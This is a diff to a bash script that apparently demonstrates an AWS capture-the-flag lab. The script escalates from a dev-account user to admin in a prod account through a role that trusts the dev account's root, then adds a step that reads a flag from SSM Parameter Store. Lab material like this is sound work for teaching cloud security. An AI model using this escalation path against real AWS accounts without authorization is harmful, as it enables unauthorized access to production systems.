@@ -236,6 +236,21 @@ else
 fi
 echo ""
 
+# [EXPLOIT] Step 8: Capture the CTF flag from SSM Parameter Store
+# The assumed admin role session is still active; AdministratorAccess grants ssm:GetParameter implicitly.
+echo -e "${YELLOW}Step 8: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/root-trust-role-assumption-to-admin"
+show_attack_cmd "Attacker (prod admin role)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
     for cmd in "${ATTACK_COMMANDS[@]}"; do
@@ -248,16 +263,17 @@ restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER_DEV in dev account ($DEV_ACCOUNT_ID)"
 echo "2. Identified: Prod role trusts :root (entire dev account)"
 echo "3. Assumed role: $TARGET_ROLE_PROD in prod account ($PROD_ACCOUNT_ID)"
 echo "4. Achieved: Administrative access in prod account"
+echo "5. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Cross-Account Attack Path:${NC}"
-echo "dev:$STARTING_USER_DEV → (sts:AssumeRole) → prod:$TARGET_ROLE_PROD → admin access"
+echo "dev:$STARTING_USER_DEV → (sts:AssumeRole) → prod:$TARGET_ROLE_PROD → admin access → (ssm:GetParameter) → CTF Flag"
 
 echo -e "\n${RED}⚠️  CRITICAL SECURITY FINDING ⚠️${NC}"
 echo -e "${RED}The target role trusts 'arn:aws:iam::${DEV_ACCOUNT_ID}:root'${NC}"
